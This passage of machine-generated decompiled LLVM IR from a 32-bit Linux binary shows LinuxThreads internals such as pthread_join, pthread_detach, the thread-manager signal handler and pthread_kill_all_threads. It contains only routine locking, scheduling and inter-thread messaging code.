dec_label_pc_80558bd:                             ; preds = %dec_label_pc_80558b3, %dec_label_pc_8055897
  %v0_80558bd = load i32, i32* @esi, align 4
  store i32 %v0_80558bd, i32* @eax, align 4
  %v0_80558bf = call i32 @suspend()
  store i32 0, i32* %stack_var_-188, align 4
  %v1_80558c9 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80558ce

dec_label_pc_80558ce:                             ; preds = %dec_label_pc_8055882, %dec_label_pc_8055878, %dec_label_pc_80558bd
  store i32 0, i32* %stack_var_-188, align 4
  %v1_80558d3 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_80558a2, { 1, 0 }
  uselistorder i32 %v0_8055878, { 1, 0, 2 }
  uselistorder i32 %v3_8055856, { 2, 1, 0 }
  uselistorder i32 %v0_8055856, { 1, 0 }
  uselistorder i32 %v0_8055842, { 1, 0 }
  uselistorder i32 %v2_80557e5, { 0, 2, 1 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 0, 7 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80558ce, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055878, { 1, 0 }
  uselistorder label %dec_label_pc_8055853, { 2, 0, 1 }
}

define i32 @pthread_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_80558db = ptrtoint i32* %stack_var_0 to i32
  %v2_80558e4 = call i32 @__pthread_do_exit(i32 %arg1, i32 %v2_80558db)
  ret i32 %v2_80558e4
}

define i32 @pthread_join() local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80558eb = load i32, i32* @esi, align 4
  %v0_80558ec = load i32, i32* @ebx, align 4
  store i32 %v0_80558ec, i32* %stack_var_-16, align 4
  %v4_80558ec = ptrtoint i32* %stack_var_-16 to i32
  %v2_80558f3 = call i32 @thread_self.1(i32 %v0_80558ec, i32 %v0_80558eb)
  store i32 %tmp10, i32* @ebp, align 4
  store i32 %v2_80558f3, i32* @edx, align 4
  %v1_805590f = urem i32 %tmp10, 1024
  %v2_805591f = mul nuw nsw i32 %v1_805590f, 16
  %v1_8055922 = add i32 %v2_805591f, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_8055922, i32* @esi, align 4
  store i32 %v1_8055922, i32* @eax, align 4
  store i32 %v1_8055922, i32* %stack_var_-28, align 4
  %v1_8055931 = call i32 @__pthread_lock(i32 %v1_8055922)
  %v0_8055936 = load i32, i32* @esi, align 4
  %v1_8055936 = add i32 %v0_8055936, 8
  %v2_8055936 = inttoptr i32 %v1_8055936 to i32*
  %v3_8055936 = load i32, i32* %v2_8055936, align 4
  store i32 %v3_8055936, i32* @ebx, align 4
  %v1_8055939 = icmp eq i32 %v3_8055936, 0
  br i1 %v1_8055939, label %dec_label_pc_8055942, label %dec_label_pc_805593d

dec_label_pc_805593d:                             ; preds = %entry
  %v1_805593d = add i32 %v3_8055936, 16
  %v2_805593d = inttoptr i32 %v1_805593d to i32*
  %v3_805593d = load i32, i32* %v2_805593d, align 4
  %v4_805593d = load i32, i32* @ebp, align 4
  %v15_805593d = icmp eq i32 %v3_805593d, %v4_805593d
  br i1 %v15_805593d, label %dec_label_pc_8055952, label %dec_label_pc_8055942

dec_label_pc_8055942:                             ; preds = %dec_label_pc_805593d, %entry
  store i32 %v0_8055936, i32* %stack_var_-204, align 4
  %v1_8055946 = inttoptr i32 %v0_8055936 to i32*
  %v2_8055946 = call i32 @__pthread_unlock(i32* %v1_8055946)
  br label %dec_label_pc_805596b

dec_label_pc_8055952:                             ; preds = %dec_label_pc_805593d
  %v12_8055959 = icmp eq i32 %v3_8055936, %v2_80558f3
  %v1_805595b = icmp eq i1 %v12_8055959, false
  br i1 %v1_805595b, label %dec_label_pc_8055973, label %dec_label_pc_805595d

dec_label_pc_805595d:                             ; preds = %dec_label_pc_8055952
  store i32 %v0_8055936, i32* %stack_var_-204, align 4
  %v1_8055961 = inttoptr i32 %v0_8055936 to i32*
  %v2_8055961 = call i32 @__pthread_unlock(i32* %v1_8055961)
  br label %dec_label_pc_805596b

dec_label_pc_805596b:                             ; preds = %dec_label_pc_805597f, %dec_label_pc_8055942, %dec_label_pc_805595d
  %v0_8055acf5 = phi i32 [ 22, %dec_label_pc_805597f ], [ 3, %dec_label_pc_8055942 ], [ 35, %dec_label_pc_805595d ]
  br label %dec_label_pc_8055ac5

dec_label_pc_8055973:                             ; preds = %dec_label_pc_8055952
  %v1_8055973 = add i32 %v3_8055936, 45
  %v2_8055973 = inttoptr i32 %v1_8055973 to i8*
  %v3_8055973 = load i8, i8* %v2_8055973, align 1
  %v4_8055973 = icmp eq i8 %v3_8055973, 0
  %v1_8055977 = icmp eq i1 %v4_8055973, false
  br i1 %v1_8055977, label %dec_label_pc_805597f, label %dec_label_pc_8055979

dec_label_pc_8055979:                             ; preds = %dec_label_pc_8055973
  %v1_8055979 = add i32 %v3_8055936, 56
  %v2_8055979 = inttoptr i32 %v1_8055979 to i32*
  %v3_8055979 = load i32, i32* %v2_8055979, align 4
  %v4_8055979 = icmp eq i32 %v3_8055979, 0
  br i1 %v4_8055979, label %dec_label_pc_805598f, label %dec_label_pc_805597f

dec_label_pc_805597f:                             ; preds = %dec_label_pc_8055979, %dec_label_pc_8055973
  store i32 %v0_8055936, i32* %stack_var_-204, align 4
  %v1_8055983 = inttoptr i32 %v0_8055936 to i32*
  %v2_8055983 = call i32 @__pthread_unlock(i32* %v1_8055983)
  br label %dec_label_pc_805596b

dec_label_pc_805598f:                             ; preds = %dec_label_pc_8055979
  %v1_805598f = add i32 %v3_8055936, 44
  %v2_805598f = inttoptr i32 %v1_805598f to i8*
  %v3_805598f = load i8, i8* %v2_805598f, align 1
  %v4_805598f = icmp eq i8 %v3_805598f, 0
  %v1_8055993 = icmp eq i1 %v4_805598f, false
  br i1 %v1_8055993, label %dec_label_pc_8055a5b, label %dec_label_pc_8055999

dec_label_pc_8055999:                             ; preds = %dec_label_pc_805598f
  store i32 %v2_80558f3, i32* @eax, align 4
  %v2_80559a0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80559a0, i32* @edx, align 4
  %v0_80559a7 = call i32 @__pthread_set_own_extricate_if()
  %v1_80559b3 = add i32 %v2_80558f3, 66
  %v2_80559b3 = inttoptr i32 %v1_80559b3 to i8*
  %v3_80559b3 = load i8, i8* %v2_80559b3, align 1
  %v4_80559b3 = icmp eq i8 %v3_80559b3, 0
  br i1 %v4_80559b3, label %dec_label_pc_80559cb, label %dec_label_pc_80559b9

dec_label_pc_80559b9:                             ; preds = %dec_label_pc_8055999
  store i32 1, i32* @edi, align 4
  %v1_80559c5 = add i32 %v2_80558f3, 64
  %v2_80559c5 = inttoptr i32 %v1_80559c5 to i8*
  %v3_80559c5 = load i8, i8* %v2_80559c5, align 1
  %v4_80559c5 = icmp eq i8 %v3_80559c5, 0
  br i1 %v4_80559c5, label %dec_label_pc_80559d7, label %dec_label_pc_80559cb

dec_label_pc_80559cb:                             ; preds = %dec_label_pc_80559b9, %dec_label_pc_8055999
  store i32 0, i32* @edi, align 4
  store i32 %v2_80558f3, i32* %v2_8055979, align 4
  br label %dec_label_pc_80559d7

dec_label_pc_80559d7:                             ; preds = %dec_label_pc_80559b9, %dec_label_pc_80559cb
  %v0_80559da = load i32, i32* @esi, align 4
  store i32 %v0_80559da, i32* %stack_var_-204, align 4
  %v1_80559db = inttoptr i32 %v0_80559da to i32*
  %v2_80559db = call i32 @__pthread_unlock(i32* %v1_80559db)
  %v0_80559e3 = load i32, i32* @edi, align 4
  %v1_80559e3 = icmp eq i32 %v0_80559e3, 0
  store i32 %v2_80558f3, i32* @eax, align 4
  br i1 %v1_80559e3, label %dec_label_pc_80559f7, label %dec_label_pc_80559e7

dec_label_pc_80559e7:                             ; preds = %dec_label_pc_80559d7
  store i32 0, i32* @edx, align 4
  %v0_80559f0 = call i32 @__pthread_set_own_extricate_if()
  br label %dec_label_pc_8055a3c

dec_label_pc_80559f7:                             ; preds = %dec_label_pc_80559d7
  %v0_80559fe = call i32 @suspend()
  store i32 %v2_80558f3, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8055a0c = call i32 @__pthread_set_own_extricate_if()
  %v1_8055a18 = add i32 %v2_80558f3, 440
  %v2_8055a18 = inttoptr i32 %v1_8055a18 to i8*
  %v3_8055a18 = load i8, i8* %v2_8055a18, align 1
  %v4_8055a18 = icmp eq i8 %v3_8055a18, 0
  br i1 %v4_8055a18, label %dec_label_pc_8055a4d, label %dec_label_pc_8055a21

dec_label_pc_8055a21:                             ; preds = %dec_label_pc_80559f7
  %v1_8055a28 = add i32 %v2_80558f3, 64
  %v2_8055a28 = inttoptr i32 %v1_8055a28 to i8*
  %v3_8055a28 = load i8, i8* %v2_8055a28, align 1
  %v4_8055a28 = icmp eq i8 %v3_8055a28, 0
  %v1_8055a2c = icmp eq i1 %v4_8055a28, false
  br i1 %v1_8055a2c, label %dec_label_pc_8055a4d, label %dec_label_pc_8055a2e

dec_label_pc_8055a2e:                             ; preds = %dec_label_pc_8055a21
  store i8 0, i8* %v2_8055a18, align 1
  br label %dec_label_pc_8055a3c

dec_label_pc_8055a3c:                             ; preds = %dec_label_pc_80559e7, %dec_label_pc_8055a2e
  store i32 %v3_8055936, i32* %stack_var_-192, align 4
  store i32 -1, i32* %stack_var_-204, align 4
  %v2_8055a48 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_80558ec)
  br label %dec_label_pc_8055a4d

dec_label_pc_8055a4d:                             ; preds = %dec_label_pc_8055a21, %dec_label_pc_80559f7, %dec_label_pc_8055a3c
  store i32 %v2_80558f3, i32* @edx, align 4
  %v0_8055a54 = load i32, i32* @esi, align 4
  store i32 %v0_8055a54, i32* @eax, align 4
  %v0_8055a56 = load i32, i32* %stack_var_-204, align 4
  %v1_8055a56 = call i32 @__pthread_lock(i32 %v0_8055a56)
  br label %dec_label_pc_8055a5b

dec_label_pc_8055a5b:                             ; preds = %dec_label_pc_805598f, %dec_label_pc_8055a4d
  %v4_8055a5b = icmp eq i32 %tmp9, 0
  br i1 %v4_8055a5b, label %dec_label_pc_8055a71, label %dec_label_pc_8055a65

dec_label_pc_8055a65:                             ; preds = %dec_label_pc_8055a5b
  %v1_8055a6c = add i32 %v3_8055936, 48
  %v2_8055a6c = inttoptr i32 %v1_8055a6c to i32*
  %v3_8055a6c = load i32, i32* %v2_8055a6c, align 4
  %v2_8055a6f = inttoptr i32 %tmp9 to i32*
  store i32 %v3_8055a6c, i32* %v2_8055a6f, align 4
  br label %dec_label_pc_8055a71

dec_label_pc_8055a71:                             ; preds = %dec_label_pc_8055a5b, %dec_label_pc_8055a65
  %v0_8055a74 = load i32, i32* @esi, align 4
  store i32 %v0_8055a74, i32* %stack_var_-220, align 4
  %v1_8055a75 = inttoptr i32 %v0_8055a74 to i32*
  %v2_8055a75 = call i32 @__pthread_unlock(i32* %v1_8055a75)
  %v0_8055a7d = load i32, i32* @global_var_8073c84.658, align 4
  %v2_8055a7d = icmp slt i32 %v0_8055a7d, 0
  br i1 %v2_8055a7d, label %dec_label_pc_8055ac3, label %dec_label_pc_8055a86

dec_label_pc_8055a86:                             ; preds = %dec_label_pc_8055a71
  %v2_8055a9d = ptrtoint i32* %stack_var_-192 to i32
  br label %dec_label_pc_8055a9d

dec_label_pc_8055a9d:                             ; preds = %dec_label_pc_8055ab9.dec_label_pc_8055a9d_crit_edge, %dec_label_pc_8055a86
  %v0_8055aa8 = phi i32 [ %v0_8055aa8.pre, %dec_label_pc_8055ab9.dec_label_pc_8055a9d_crit_edge ], [ %v0_8055a7d, %dec_label_pc_8055a86 ]
  store i32 %v0_8055aa8, i32* %stack_var_-220, align 4
  %v3_8055aae = call i32 @__libc_write(i32 %v0_8055aa8, i32 %v2_8055a9d, i32 148)
  %v8_8055ab6 = icmp eq i32 %v3_8055aae, -1
  %v1_8055ab7 = icmp eq i1 %v8_8055ab6, false
  br i1 %v1_8055ab7, label %dec_label_pc_8055ac3, label %dec_label_pc_8055ab9

dec_label_pc_8055ab9:                             ; preds = %dec_label_pc_8055a9d
  %v0_8055ab9 = load i32, i32* %stack_var_-220, align 4
  %v1_8055ab9 = call i32 @__errno_location(i32 %v0_8055ab9)
  %v1_8055abe = inttoptr i32 %v1_8055ab9 to i32*
  %v2_8055abe = load i32, i32* %v1_8055abe, align 4
  %v11_8055abe = icmp eq i32 %v2_8055abe, 4
  br i1 %v11_8055abe, label %dec_label_pc_8055ab9.dec_label_pc_8055a9d_crit_edge, label %dec_label_pc_8055ab9.dec_label_pc_8055ac3.loopexit_crit_edge

dec_label_pc_8055ab9.dec_label_pc_8055ac3.loopexit_crit_edge: ; preds = %dec_label_pc_8055ab9
  br label %dec_label_pc_8055ac3

dec_label_pc_8055ab9.dec_label_pc_8055a9d_crit_edge: ; preds = %dec_label_pc_8055ab9
  %v0_8055aa8.pre = load i32, i32* @global_var_8073c84.658, align 4
  br label %dec_label_pc_8055a9d

dec_label_pc_8055ac3:                             ; preds = %dec_label_pc_8055a9d, %dec_label_pc_8055ab9.dec_label_pc_8055ac3.loopexit_crit_edge, %dec_label_pc_8055a71
  br label %dec_label_pc_8055ac5

dec_label_pc_8055ac5:                             ; preds = %dec_label_pc_805596b, %dec_label_pc_8055ac3
  %v0_8055acf = phi i32 [ %v0_8055acf5, %dec_label_pc_805596b ], [ 0, %dec_label_pc_8055ac3 ]
  %v2_8055acc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_8055acc, i32* @esi, align 4
  store i32 134567822, i32* @edi, align 4
  ret i32 %v0_8055acf

; uselistorder directives
  uselistorder i32 %v0_8055aa8, { 1, 0 }
  uselistorder i32 %v3_8055936, { 3, 5, 4, 2, 6, 0, 1, 7, 8 }
  uselistorder i32 %v0_8055936, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32 %v2_80558f3, { 1, 8, 7, 6, 5, 4, 3, 2, 9, 0, 10 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 ()* @suspend, { 1, 0 }
  uselistorder i32 ()* @__pthread_set_own_extricate_if, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055ac5, { 1, 0 }
  uselistorder label %dec_label_pc_8055ac3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055a71, { 1, 0 }
  uselistorder label %dec_label_pc_8055a5b, { 1, 0 }
  uselistorder label %dec_label_pc_8055a4d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055a3c, { 1, 0 }
  uselistorder label %dec_label_pc_80559d7, { 1, 0 }
  uselistorder label %dec_label_pc_805596b, { 0, 2, 1 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_8055ad2 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8055ae4 = urem i32 %arg1, 1024
  %v2_8055ae9 = mul nuw nsw i32 %v1_8055ae4, 16
  %v1_8055aec = add i32 %v2_8055ae9, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_8055aec, i32* @esi, align 4
  store i32 %v1_8055aec, i32* @eax, align 4
  %v1_8055af4 = call i32 @__pthread_lock(i32 %v0_8055ad2)
  %v0_8055af9 = load i32, i32* @esi, align 4
  %v1_8055af9 = add i32 %v0_8055af9, 8
  %v2_8055af9 = inttoptr i32 %v1_8055af9 to i32*
  %v3_8055af9 = load i32, i32* %v2_8055af9, align 4
  %v1_8055afc = icmp eq i32 %v3_8055af9, 0
  br i1 %v1_8055afc, label %dec_label_pc_8055b05, label %dec_label_pc_8055b00

dec_label_pc_8055b00:                             ; preds = %entry
  %v1_8055b00 = add i32 %v3_8055af9, 16
  %v2_8055b00 = inttoptr i32 %v1_8055b00 to i32*
  %v3_8055b00 = load i32, i32* %v2_8055b00, align 4
  %v4_8055b00 = load i32, i32* @edi, align 4
  %v15_8055b00 = icmp eq i32 %v3_8055b00, %v4_8055b00
  br i1 %v15_8055b00, label %dec_label_pc_8055b15, label %dec_label_pc_8055b05

dec_label_pc_8055b05:                             ; preds = %dec_label_pc_8055b00, %entry
  store i32 %v0_8055af9, i32* %stack_var_-188, align 4
  %v1_8055b09 = inttoptr i32 %v0_8055af9 to i32*
  %v2_8055b09 = call i32 @__pthread_unlock(i32* %v1_8055b09)
  br label %dec_label_pc_8055b29

dec_label_pc_8055b15:                             ; preds = %dec_label_pc_8055b00
  %v1_8055b15 = add i32 %v3_8055af9, 45
  %v2_8055b15 = inttoptr i32 %v1_8055b15 to i8*
  %v3_8055b15 = load i8, i8* %v2_8055b15, align 1
  %v4_8055b15 = icmp eq i8 %v3_8055b15, 0
  br i1 %v4_8055b15, label %dec_label_pc_8055b2e, label %dec_label_pc_8055b1b

dec_label_pc_8055b1b:                             ; preds = %dec_label_pc_8055b15
  store i32 %v0_8055af9, i32* %stack_var_-188, align 4
  %v1_8055b1f = inttoptr i32 %v0_8055af9 to i32*
  %v2_8055b1f = call i32 @__pthread_unlock(i32* %v1_8055b1f)
  br label %dec_label_pc_8055b29

dec_label_pc_8055b29:                             ; preds = %dec_label_pc_8055b34, %dec_label_pc_8055b05, %dec_label_pc_8055b1b
  %v0_8055ba83 = phi i32 [ 0, %dec_label_pc_8055b34 ], [ 3, %dec_label_pc_8055b05 ], [ 22, %dec_label_pc_8055b1b ]
  br label %dec_label_pc_8055b9f

dec_label_pc_8055b2e:                             ; preds = %dec_label_pc_8055b15
  %v1_8055b2e = add i32 %v3_8055af9, 56
  %v2_8055b2e = inttoptr i32 %v1_8055b2e to i32*
  %v3_8055b2e = load i32, i32* %v2_8055b2e, align 4
  %v4_8055b2e = icmp eq i32 %v3_8055b2e, 0
  br i1 %v4_8055b2e, label %dec_label_pc_8055b41, label %dec_label_pc_8055b34

dec_label_pc_8055b34:                             ; preds = %dec_label_pc_8055b2e
  store i32 %v0_8055af9, i32* %stack_var_-188, align 4
  %v1_8055b38 = inttoptr i32 %v0_8055af9 to i32*
  %v2_8055b38 = call i32 @__pthread_unlock(i32* %v1_8055b38)
  br label %dec_label_pc_8055b29

dec_label_pc_8055b41:                             ; preds = %dec_label_pc_8055b2e
  store i8 1, i8* %v2_8055b15, align 1
  %v1_8055b48 = add i32 %v3_8055af9, 44
  %v2_8055b48 = inttoptr i32 %v1_8055b48 to i8*
  %v3_8055b48 = load i8, i8* %v2_8055b48, align 1
  %v4_8055b48 = sext i8 %v3_8055b48 to i32
  store i32 %v4_8055b48, i32* @ebx, align 4
  %v0_8055b4c = load i32, i32* @esi, align 4
  store i32 %v0_8055b4c, i32* %stack_var_-188, align 4
  %v1_8055b4d = inttoptr i32 %v0_8055b4c to i32*
  %v2_8055b4d = call i32 @__pthread_unlock(i32* %v1_8055b4d)
  %v1_8055b55 = icmp eq i8 %v3_8055b48, 0
  br i1 %v1_8055b55, label %dec_label_pc_8055b9d, label %dec_label_pc_8055b59

dec_label_pc_8055b59:                             ; preds = %dec_label_pc_8055b41
  %v0_8055b59 = load i32, i32* @global_var_8073c84.658, align 4
  %v2_8055b59 = icmp slt i32 %v0_8055b59, 0
  br i1 %v2_8055b59, label %dec_label_pc_8055b9d, label %dec_label_pc_8055b62

dec_label_pc_8055b62:                             ; preds = %dec_label_pc_8055b59
  %v0_8055b62 = load i32, i32* %stack_var_-188, align 4
  %v1_8055b62 = load i32, i32* %stack_var_-184, align 4
  %v2_8055b62 = call i32 @thread_self.1(i32 %v0_8055b62, i32 %v1_8055b62)
  store i32 %v2_8055b62, i32* %stack_var_-160, align 4
  %v2_8055b77 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_8055b77

dec_label_pc_8055b77:                             ; preds = %dec_label_pc_8055b93, %dec_label_pc_8055b62
  store i32 %v2_8055b77, i32* %stack_var_-184, align 4
  %v0_8055b82 = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8055b82, i32* %stack_var_-188, align 4
  %v3_8055b88 = call i32 @__libc_write(i32 %v0_8055b82, i32 %v2_8055b77, i32 148)
  %v8_8055b90 = icmp eq i32 %v3_8055b88, -1
  %v1_8055b91 = icmp eq i1 %v8_8055b90, false
  br i1 %v1_8055b91, label %dec_label_pc_8055b9d, label %dec_label_pc_8055b93

dec_label_pc_8055b93:                             ; preds = %dec_label_pc_8055b77
  %v0_8055b93 = load i32, i32* %stack_var_-188, align 4
  %v1_8055b93 = call i32 @__errno_location(i32 %v0_8055b93)
  %v1_8055b98 = inttoptr i32 %v1_8055b93 to i32*
  %v2_8055b98 = load i32, i32* %v1_8055b98, align 4
  %v11_8055b98 = icmp eq i32 %v2_8055b98, 4
  br i1 %v11_8055b98, label %dec_label_pc_8055b77, label %dec_label_pc_8055b93.dec_label_pc_8055b9d.loopexit_crit_edge

dec_label_pc_8055b93.dec_label_pc_8055b9d.loopexit_crit_edge: ; preds = %dec_label_pc_8055b93
  br label %dec_label_pc_8055b9d

dec_label_pc_8055b9d:                             ; preds = %dec_label_pc_8055b77, %dec_label_pc_8055b93.dec_label_pc_8055b9d.loopexit_crit_edge, %dec_label_pc_8055b59, %dec_label_pc_8055b41
  br label %dec_label_pc_8055b9f

dec_label_pc_8055b9f:                             ; preds = %dec_label_pc_8055b29, %dec_label_pc_8055b9d
  %v0_8055ba8 = phi i32 [ %v0_8055ba83, %dec_label_pc_8055b29 ], [ 0, %dec_label_pc_8055b9d ]
  ret i32 %v0_8055ba8

; uselistorder directives
  uselistorder i32 %v3_8055af9, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8055af9, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 (i32, i32)* @thread_self.1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055b9f, { 1, 0 }
  uselistorder label %dec_label_pc_8055b9d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8055b29, { 0, 2, 1 }
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8055bac = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8055bb4 = load i32, i32* @global_var_8073ab8.660, align 8
  %v7_8055bba = icmp slt i32 %v1_8055bb4, %arg1
  br i1 %v7_8055bba, label %dec_label_pc_8055bbc, label %dec_label_pc_8055bf3

dec_label_pc_8055bbc:                             ; preds = %entry
  %v1_8055bc1 = call i32 @sched_get_priority_max(i32 1)
  %v0_8055bc9 = load i32, i32* @ebx, align 4
  %v2_8055bc9 = sub i32 %v0_8055bc9, %v1_8055bc1
  %v8_8055bc9 = xor i32 %v0_8055bc9, %v1_8055bc1
  %v9_8055bc9 = xor i32 %v2_8055bc9, %v0_8055bc9
  %v10_8055bc9 = and i32 %v9_8055bc9, %v8_8055bc9
  %v11_8055bc9 = icmp slt i32 %v10_8055bc9, 0
  %v13_8055bc9 = icmp slt i32 %v2_8055bc9, 0
  %v2_8055bcb = icmp ne i1 %v13_8055bc9, %v11_8055bc9
  %v3_8055bcb = zext i1 %v2_8055bcb to i32
  %v2_8055bd1 = add i32 %v3_8055bcb, %v0_8055bc9
  store i32 %v2_8055bd1, i32* %stack_var_-8, align 4
  %v2_8055bd8 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8055bdf = load i32, i32* @global_var_8073ab4.661, align 4
  %v3_8055be5 = call i32 @sched_setscheduler(i32 %v0_8055bdf, i32 1, i32 %v2_8055bd8)
  %v0_8055bea = load i32, i32* @ebx, align 4
  store i32 %v0_8055bea, i32* @global_var_8073ab8.660, align 8
  br label %dec_label_pc_8055bf3

dec_label_pc_8055bf3:                             ; preds = %entry, %dec_label_pc_8055bbc
  %.0 = phi i32 [ %v3_8055be5, %dec_label_pc_8055bbc ], [ undef, %entry ]
  store i32 %v0_8055bac, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_8055bc9, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8055bf3, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v0_8055c00 = load i32, i32* @global_var_80784a0.662, align 32
  %v1_8055c05 = icmp eq i32 %v0_8055c00, 0
  %v1_8055c07 = icmp eq i1 %v1_8055c05, false
  br i1 %v1_8055c07, label %dec_label_pc_8055c15.thread, label %dec_label_pc_8055c15

dec_label_pc_8055c15.thread:                      ; preds = %entry
  store i32 1, i32* @global_var_80784a0.662, align 32
  br label %dec_label_pc_8055c59

dec_label_pc_8055c15:                             ; preds = %entry
  %v0_8055c0b = load i32, i32* @global_var_80784a4.663, align 4
  %v1_8055c0b = icmp eq i32 %v0_8055c0b, 0
  %v1_8055c12 = icmp eq i1 %v1_8055c0b, false
  %phitmp = icmp eq i1 %v1_8055c12, false
  store i32 1, i32* @global_var_80784a0.662, align 32
  br i1 %phitmp, label %dec_label_pc_8055c59, label %dec_label_pc_8055c23

dec_label_pc_8055c23:                             ; preds = %dec_label_pc_8055c15
  store i32 0, i32* %stack_var_-148, align 4
  %v2_8055c33 = ptrtoint i32* %stack_var_-148 to i32
  br label %dec_label_pc_8055c33

dec_label_pc_8055c33:                             ; preds = %dec_label_pc_8055c4f, %dec_label_pc_8055c23
  %v0_8055c3e = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8055c3e, i32* %stack_var_-188, align 4
  %v3_8055c44 = call i32 @__libc_write(i32 %v0_8055c3e, i32 %v2_8055c33, i32 148)
  %v1_8055c4c = add i32 %v3_8055c44, 1
  %v8_8055c4c = icmp eq i32 %v1_8055c4c, 0
  %v1_8055c4d = icmp eq i1 %v8_8055c4c, false
  br i1 %v1_8055c4d, label %dec_label_pc_8055c59, label %dec_label_pc_8055c4f

dec_label_pc_8055c4f:                             ; preds = %dec_label_pc_8055c33
  %v0_8055c4f = load i32, i32* %stack_var_-188, align 4
  %v1_8055c4f = call i32 @__errno_location(i32 %v0_8055c4f)
  %v1_8055c54 = inttoptr i32 %v1_8055c4f to i32*
  %v2_8055c54 = load i32, i32* %v1_8055c54, align 4
  %v11_8055c54 = icmp eq i32 %v2_8055c54, 4
  br i1 %v11_8055c54, label %dec_label_pc_8055c33, label %dec_label_pc_8055c4f.dec_label_pc_8055c59.loopexit_crit_edge

dec_label_pc_8055c4f.dec_label_pc_8055c59.loopexit_crit_edge: ; preds = %dec_label_pc_8055c4f
  br label %dec_label_pc_8055c59

dec_label_pc_8055c59:                             ; preds = %dec_label_pc_8055c33, %dec_label_pc_8055c15.thread, %dec_label_pc_8055c4f.dec_label_pc_8055c59.loopexit_crit_edge, %dec_label_pc_8055c15
  %v0_8055c5f = phi i32 [ %v0_8055c00, %dec_label_pc_8055c15 ], [ %v1_8055c4f, %dec_label_pc_8055c4f.dec_label_pc_8055c59.loopexit_crit_edge ], [ %v0_8055c00, %dec_label_pc_8055c15.thread ], [ %v1_8055c4c, %dec_label_pc_8055c33 ]
  ret i32 %v0_8055c5f

; uselistorder directives
  uselistorder i32* %stack_var_-148, { 1, 0 }
  uselistorder label %dec_label_pc_8055c59, { 2, 0, 3, 1 }
}

define i32 @pthread_kill_all_threads() local_unnamed_addr {
dec_label_pc_8055c88:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055c62 = load i32, i32* @eax, align 4
  %v0_8055c64 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v0_8055c69 = load i32, i32* @ebx, align 4
  store i32 %v0_8055c69, i32* %stack_var_-12, align 4
  %v0_8055c6a = load i32, i32* @edx, align 4
  store i32 %v0_8055c64, i32* @ebx, align 4
  %v1_8055c88 = icmp eq i32 %v0_8055c6a, 0
  br i1 %v1_8055c88, label %dec_label_pc_8055c9a, label %dec_label_pc_8055c8c

dec_label_pc_8055c8c:                             ; preds = %dec_label_pc_8055c88
  %v1_8055c8f = add i32 %v0_8055c64, 20
  %v2_8055c8f = inttoptr i32 %v1_8055c8f to i32*
  %v3_8055c8f = load i32, i32* %v2_8055c8f, align 4
  %v2_8055c92 = call i32 @kill(i32 %v3_8055c8f, i32 %v0_8055c62)
  %v2_8055c9a.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8055c9a

dec_label_pc_8055c9a:                             ; preds = %dec_label_pc_8055c88, %dec_label_pc_8055c8c
  %v2_8055c9a = phi i32 [ %v0_8055c69, %dec_label_pc_8055c88 ], [ %v2_8055c9a.pre, %dec_label_pc_8055c8c ]
  %v0_8055c9d = phi i32 [ %v0_8055c64, %dec_label_pc_8055c88 ], [ %v2_8055c92, %dec_label_pc_8055c8c ]
  store i32 %v2_8055c9a, i32* @ebx, align 4
  ret i32 %v0_8055c9d

; uselistorder directives
